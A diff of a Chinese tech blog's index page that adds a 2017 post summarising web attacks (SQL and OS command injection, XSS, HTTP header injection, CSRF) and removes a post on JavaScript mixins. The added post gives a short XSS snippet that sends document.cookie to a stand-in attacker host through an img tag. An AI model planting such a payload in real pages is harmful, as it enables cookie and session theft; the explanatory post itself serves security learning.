@@ -155,6 +155,89 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Web的攻击技术" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2017/03/23/Web的攻击技术/">Web的攻击技术</a>
+    </h1>
+  
+
+        
+        <a href="/2017/03/23/Web的攻击技术/" class="archive-article-date">
+  	<time datetime="2017-03-23T06:20:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-23</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>Web应用的攻击模式：</p>
+<ol>
+<li>主动攻击  2. 被动攻击</li>
+</ol>
+<p>1.以服务器为目标的主动攻击： 主动攻击是指攻击者通过直接访问Web应用， 把攻击代码传入的攻击模式 ， 主动攻击模式最具有代表性的攻击是 SQL注入攻击和OS命令注入攻击<br>  1.SQL注入攻击: 是指针对WebYin应用使用的数据库，通过运行非法的SQL而产生的攻击。<br>  2 OS命令注入攻击是只通过Web应用，执行非法的操作系统命令达到攻击的目的</p>
+<p>2.以服务器为目标的被动攻击： 被动攻击是指利用全套策略执行代码的攻击模式。被动攻击过程中，攻击者不直接对目标Web英语访问发起攻击。<br>   被动攻击的攻击模式如下：1。 攻击者诱使用户点击已经设置好的陷阱， 而陷阱会启动发送已嵌入攻击代码的http请求。  2. 当用户不知不觉中招后，用户的浏览器或邮件客户端就会触发这个陷阱。 3. 中招后的用户浏览器会把含有攻击代码的HTTP请求发送给作为攻击目标的Web应用， 运行攻击代码。 4.执行完攻击代码，存在安全漏洞的Web应用汇称为攻击者的调班， 可能导致用户所持的Cookie等个人信息被窃取， 登录状态中的用户权限遭恶意滥用等后果，<br>    典型的攻击模式中具有代表性的攻击是跨站脚本攻击（XSS） 和 跨站点请求伪造（CSRF）;</p>
+<p>  2.1 跨站脚本攻击（XSS)：<br>      定义：是指在存有安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或者Javascript进行的一种攻击。 动态创建的脚本可能隐藏着安全漏洞。<br>      跨站脚本攻击可能造成的影响: </p>
+<pre><code>   1. 利用虚假输入表单骗取用户个人信息
+   2. 利用脚本窃取用户的Cookie值， 被害者在不知情的情况下帮助攻击者发送恶意请求
+   3. 显示伪造的文章或者图片
+
+跨站脚本攻击的案例：
+  在表单中设入的圈套：
+         1、在输入用户信息的时候，可能输入含有恶意的HTML标签， 动态生成HTML处发生
+         2.某些网站通过URL中的查询字段来指定表单用户的ID,  攻击者在这个URL后面嵌入恶意代码的URL,这段URL包含脚本， 那么在浏览器打开该URL后， 设置好的脚本会运行，将用户输入的认证信息发送到攻击者网站
+  对用户Cookie信息的获取:
+       在脚本内嵌入指定的xss.js 文件
+       该文件定义如下:
+       <figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">var content = escape(document.cookie);</div><div class="line">document.write(<span class="string">'&lt;img src = http://hackr.js/?&gt;'</span>);</div><div class="line">document.write(content);</div><div class="line">document.write(<span class="string">'&gt;'</span>);</div></pre></td></tr></table></figure>
+
+      在存在可跨站脚本攻击安全漏洞的Web应用上执行上面这段js代码， 即可访问该域名下的Cookie信息， 然后将这些信息发送至攻击者的Web网站， 记录在它的登陆日志中
+</code></pre><p>   2.2 HTTP首部注入攻击<br>        是指攻击者通过响应首部字段内插入换行，添加任意响应首部或者主体的一种攻击模式，可能造成的影响: 设置任意的Cookie信息， 重定向至任意的URL, 显示任意的主体（向首部主体内添加内容– HTTP响应式截断效应）<br>   2.3 跨站点请求伪造攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或车顶信息等某些状态的更新。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">web  攻击</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2017/03/23/Web的攻击技术/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+
+
+
+
+
+
+
+  
     <article id="post-关于数组去重的几种方法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -797,58 +880,6 @@
 
 
   
-    <article id="post-mixin模式" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2017/03/13/mixin模式/">&#39;mixin模式&#39;</a>
-    </h1>
-  
-
-        
-        <a href="/2017/03/13/mixin模式/" class="archive-article-date">
-  	<time datetime="2017-03-13T11:56:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-03-13</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>mixin模式 –感觉类似于cpp里面的抽象出来的超类， 子类对象可以很轻松的集成超类中的属性和方法，优点:<br>增加了函数复用，减少代码量。</p>
-<p>代码实现<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line"> &lt;html&gt;</div><div class="line">   &lt;head&gt;</div><div class="line">     &lt;title&gt;Mixin模式&lt;/title&gt; </div><div class="line">   &lt;/head&gt;</div><div class="line">   &lt;body&gt;</div><div class="line">   	  &lt;script&gt;</div><div class="line">         var Car = <span class="keyword">function</span>(settings) &#123;</div><div class="line">         	this.model = settings.model || <span class="string">'no model provided'</span>,</div><div class="line">         	this.color = settings.color || <span class="string">'no color provided'</span></div><div class="line">         &#125;</div><div class="line"></div><div class="line">         var Mixin = <span class="function"><span class="title">function</span></span>() &#123;&#125;</div><div class="line"></div><div class="line">         Mixin.prototype = &#123;</div><div class="line">         	driveForward: <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">         		console.log(<span class="string">'drive forword'</span>);</div><div class="line">         	&#125;,</div><div class="line">            driveBackward: <span class="function"><span class="title">function</span></span>() &#123;</div><div class="line">            	console.log(<span class="string">'drive backwords'</span>)</div><div class="line">            &#125;</div><div class="line">         &#125;;</div><div class="line"></div><div class="line">         <span class="keyword">function</span> argument(receivingClass, givingClass) &#123;</div><div class="line">         	<span class="keyword">if</span>(arguments[2]) &#123;</div><div class="line">         		<span class="keyword">for</span>(var i = 2, len = arguments.length; i &lt; len; i++) &#123;</div><div class="line">         			receivingClass.prototype[arguments[i]] = givingClass.prototype[arguments[i]];</div><div class="line">         		&#125;</div><div class="line">         	&#125; <span class="keyword">else</span> &#123;</div><div class="line">         		<span class="keyword">for</span>(var key <span class="keyword">in</span> givingClass) &#123;</div><div class="line">         			<span class="keyword">if</span>(!Object.hasOwnProperty(receivingClass.prototype, key)) &#123;</div><div class="line">         				receivingClass.prototype[key] = givingClass.prototype[key];</div><div class="line">         			&#125;</div><div class="line">         		&#125;</div><div class="line">         	&#125;</div><div class="line">         &#125;</div><div class="line">        </div><div class="line">        //只添加特定的方法到Car里面</div><div class="line">         argument(Car, Mixin, <span class="string">'driveForward'</span>, <span class="string">'driveBackward'</span>);</div><div class="line"></div><div class="line">         var myCar = new Car(&#123;</div><div class="line">         	model:<span class="string">'BWM'</span>,</div><div class="line">         	color:<span class="string">'red'</span></div><div class="line">         &#125;);</div><div class="line"></div><div class="line">         myCar.driveForward();</div><div class="line">         myCar.driveBackward();</div><div class="line">   	  &lt;/script&gt;</div><div class="line">   &lt;/body&gt;</div><div class="line"> &lt;/html&gt;</div></pre></td></tr></table></figure></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2017/03/13/mixin模式/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
@@ -942,11 +973,15 @@
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">jquery</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Jquery</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">jquery</a>
+                <a href="javascript:void(0)" class="js-tag color3">web  攻击</a>
               </li>
              
               <li class="article-tag-list-item">
